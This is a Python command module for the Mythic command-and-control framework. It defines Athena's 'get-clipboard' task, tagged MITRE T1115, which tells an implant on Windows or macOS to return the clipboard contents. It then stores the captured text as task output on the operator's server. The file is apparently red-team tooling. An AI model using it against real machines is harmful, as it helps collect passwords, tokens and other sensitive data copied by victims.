from mythic_container.MythicRPC import *
from mythic_container.MythicCommandBase import *
import json

class GetClipboardArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class GetClipboardCommand(CommandBase):
    cmd = "get-clipboard"
    needs_admin = False
    help_cmd = "get-clipboard"
    description = "Tasks Athena to return the contents of the clipboard."
    version = 1
    supported_ui_features = []
    author = "@checkymander"
    attackmapping = ["T1115"]
    argument_class = GetClipboardArguments
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows, SupportedOS.MacOS]
    )
    
    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        
        # Set the display parameters for the task
        response.DisplayParams = "Retrieving clipboard contents"
        
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        """
        Process the agent response containing clipboard data
        """
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        
        try:
            # The response should be the clipboard content as a string
            if response:
                # Create a task response output
                await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                    TaskID=task.Task.ID,
                    Response=response.encode()
                ))
                
                # Also update the task output in the database
                await SendMythicRPCResponseUpdate(MythicRPCResponseUpdateMessage(
                    TaskID=task.Task.ID,
                    Response=response
                ))
            else:
                await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                    TaskID=task.Task.ID,
                    Response="No clipboard data retrieved".encode()
                ))
                
        except Exception as e:
            # Handle any processing errors
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=task.Task.ID,
                Response=f"Error processing clipboard response: {str(e)}".encode()
            ))
            resp.Success = False
            resp.Error = str(e)
            
        return resp